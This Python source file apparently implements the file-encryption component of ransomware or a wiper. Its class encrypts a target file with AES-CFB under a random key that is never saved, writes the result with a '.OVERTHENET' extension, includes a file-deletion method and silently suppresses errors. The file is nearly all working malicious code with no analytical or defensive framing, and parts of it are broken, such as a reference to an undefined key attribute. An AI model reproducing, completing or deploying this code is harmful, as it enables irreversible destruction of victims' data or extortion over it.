import os,base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from src._loggingfile import *

__all__ = ["ENCFILEAES"]

#EXAMPLE

class ENCFILEAES(object):
    def __new__(cls,tardat:str):
        rb = object.__new__(cls)
        return rb
    def __init__(self,tardat:str):
        self.__td = tardat
        self.__ex = ".OVERTHENET"
        self.__cd = os.getcwd()
        self.__pd = os.path.dirname(self.__cd)
        self.__mx = 0x10000
        self.__rd = None
        self.__bd = None
        self.__eky = None
    def __str__(self):
        return "ENCRYPTION FILES - PROCESS"
    def __call__(self):
        return
    def __getstate__(self):
        raise TypeError("D.E.N.I.E.D")
    def __repr__(self):
        return ENCFILEAES.__doc__
    def _REMOVE_DATA(self,inf):
        os.remove(inf)
    def _BD64(self):
        return base64.b64decode(self.__pk)
    def _ENCKEY(self):
        self.__eky = get_random_bytes(32)
        # print(self.__eky)
        return self.__eky
    def _CFB(self):
        return AES.new(self._ENCKEY(),AES.MODE_CFB)
    def _ENCREAD(self):
        return open(self.__td,"rb")
    def _ENCSAVE(self,ex):
        try:
            sf = self.__td.split(ex)[0].replace(".","")
            ef = sf+self.__ex
            ff = open(ef,"wb")
            return ff
        except KeyboardInterrupt:
            raise UserWarning("CLOSED BY USER")
        except Exception as err:
            # print(str(err))
            pass
    def _LAUNCH(self):
        ex = self.__td.split(".")[-1].lower()
        edd = self._ENCREAD()
        buff = edd.read(self.__mx)
        aesc = self._CFB()
        wrt = self._ENCSAVE(ex)
        while len(buff) > 0:
            try:
                cby = aesc.encrypt(buff)
                wrt.write(cby)
                buff = edd.read(self.__mx)
            except KeyboardInterrupt:
                edd.close()
                wrt.close()
                raise UserWarning("CLOSED BY USER")
            except Exception as err:
                # print(str(err))
                pass
        try:
            edd.close()
            wrt.close()
        except:
            pass